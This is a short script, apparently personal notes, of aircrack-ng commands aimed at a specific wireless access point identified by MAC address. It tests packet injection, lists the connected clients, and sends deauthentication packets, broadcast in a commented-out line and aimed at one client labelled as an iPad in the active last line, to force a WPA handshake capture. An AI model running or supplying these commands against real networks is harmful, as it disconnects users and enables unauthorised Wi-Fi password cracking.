# sudo aireplay-ng --test wlp3s0 # Packet injection testing
# sudo airodump-ng --bssid 8E:FA:5F:79:06:05 --channel 6 wlp3s0 # Checking the list who is connected
# sudo aireplay-ng --deauth 10 -a 8E:FA:5F:79:06:05 wlp3s0 # Frocing handshake using deauthintication packet (broadcast)
# E6:09:9A:D8:09:52 -> iPad
sudo aireplay-ng --deauth 10 -a 8E:FA:5F:79:06:05 -c E6:09:9A:D8:09:52 wlp3s0 # Frocing handshake using deauthintication packet (specific client)